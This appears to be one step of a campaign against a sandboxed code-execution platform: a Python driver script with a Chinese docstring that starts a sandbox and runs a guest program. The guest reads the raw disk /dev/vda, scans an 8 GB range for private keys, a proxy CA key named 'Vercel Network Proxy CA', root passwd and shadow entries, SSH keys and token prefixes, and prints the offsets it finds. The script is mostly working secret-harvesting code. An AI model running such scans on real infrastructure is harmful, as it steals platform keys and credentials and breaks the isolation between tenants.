# -*- coding: utf-8 -*-
"""Phase40: proxy-ca 上下文补提取 + 段4(22-30GB)扫描 + ca-cert 文件名"""
import sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

GUEST = r'''
import os

fd = os.open('/dev/vda', os.O_RDONLY)

# 0) proxy-ca hits from scan3 (retry, was truncated last time)
for off in [0x41ff8b044, 0x41ff8c1b8, 0x437b69624, 0x437b696b3, 0x437b6977c,
            0x437b697f9, 0x4a3bb8cc0]:
    try:
        chunk = os.pread(fd, 1024, off - 512)
        txt = chunk.replace(b'\x00', b' ')
        print('[proxy-ca 0x%x] %r' % (off, txt[:900]), flush=True)
    except Exception as e:
        print('[proxy-ca 0x%x] EXC %s' % (off, e), flush=True)

# 1) scan segment 4: 22GB - 30GB
EC_PK = b'\x2a\x86\x48\xce\x3d\x02\x01\x06\x08\x2a\x86\x48\xce\x3d\x03\x01\x07\x04\x20'
RSA_PK = b'\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x04\x82'
KEYS = [
    (b'BEGIN EC PRIVATE KEY', 'PEM_EC'),
    (b'BEGIN RSA PRIVATE KEY', 'PEM_RSA'),
    (b'BEGIN PRIVATE KEY', 'PEM_PKCS8'),
    (b'BEGIN OPENSSH PRIVATE KEY', 'PEM_SSH'),
    (b'ca.key', 'ca.key'),
    (b'cert.key', 'cert.key'),
    (b'ca-cert', 'ca-cert'),
    (b'proxy-ca', 'proxy-ca'),
    (b'root:x:0:0', 'passwd_root'),
    (b'ssh-rsa', 'ssh-rsa'),
    (b'ssh-ed25519', 'ssh-ed25519'),
    (b'authorized_keys', 'auth_keys'),
    (b'shadow', 'shadow'),
    (b'sbx_', 'sbx_'),
    (b'team_', 'team_'),
    (b'vcp_', 'vcp_'),
    (b'Vercel Network Proxy CA', 'CA_NAME'),
    (EC_PK, 'DER_EC_KEY'),
    (RSA_PK, 'DER_RSA_KEY'),
]
start = 22 * 1024 * 1024 * 1024
end = 30 * 1024 * 1024 * 1024
hits = {}
total = 0
for off in range(start, end, 4 * 1024 * 1024):
    try:
        chunk = os.pread(fd, 4 * 1024 * 1024, off)
    except Exception:
        break
    total += len(chunk)
    for k, name in KEYS:
        idx = 0
        while True:
            idx = chunk.find(k, idx)
            if idx < 0:
                break
            hits.setdefault(name, []).append(off + idx)
            idx += len(k)
os.close(fd)
print('[scan4] total=%d MB' % (total // 1024 // 1024), flush=True)
for k, v in hits.items():
    print('== %s (%d) ==' % (k, len(v)), flush=True)
    for item in v[:15]:
        print('   off=0x%x' % item, flush=True)
print('done', flush=True)
'''
code = "cat > /tmp/pg48.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg48.py"

if __name__ == "__main__":
    sid = fresh_sandbox_deny_all("fwtest18")
    time.sleep(2)
    c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=200000)
    print('cmd:', c, flush=True)
    print(r[:14000], flush=True)
